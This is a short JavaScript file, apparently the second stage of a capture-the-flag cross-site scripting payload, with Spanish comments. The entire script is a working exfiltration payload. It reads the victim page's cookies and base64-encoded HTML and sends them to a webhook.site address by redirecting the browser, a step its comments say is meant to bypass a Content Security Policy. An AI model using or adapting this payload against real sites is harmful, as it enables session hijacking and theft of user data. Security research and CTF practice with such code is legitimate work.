/**
 * Segunda etapa: exfil por navegacion (CSP default-src bloquea fetch/img a terceros).
 * Prioridad webhook: window.__CTF_WEBHOOK__ (inyectado por ping-loader data-wh) > ?w= > fallback.
 */
(function () {
  var WH = "https://webhook.site/ddfc979f-7c8c-4860-a3c3-dc75213cb108";
  try {
    if (typeof window.__CTF_WEBHOOK__ === "string" && window.__CTF_WEBHOOK__.length) {
      WH = window.__CTF_WEBHOOK__;
      try {
        delete window.__CTF_WEBHOOK__;
      } catch (e) {
        window.__CTF_WEBHOOK__ = "";
      }
    }
  } catch (e) {}
  try {
    var w = new URLSearchParams(window.location.search).get("w");
    if (w && /^https?:\/\//i.test(w)) WH = w;
  } catch (e) {}
  var c = "";
  try {
    c = document.cookie;
  } catch (e) {
    c = String(e);
  }
  var h = "";
  try {
    h = document.documentElement ? document.documentElement.outerHTML : "";
    if (h.length > 3500) h = h.slice(0, 3500);
    h = btoa(unescape(encodeURIComponent(h)));
    if (h.length > 4000) h = h.slice(0, 4000);
  } catch (e) {
    h = btoa(String(e));
  }
  window.location =
    WH +
    "?ping=1&c=" +
    encodeURIComponent(c) +
    "&t=" +
    encodeURIComponent(document.title || "") +
    "&d=" +
    encodeURIComponent(h);
})();
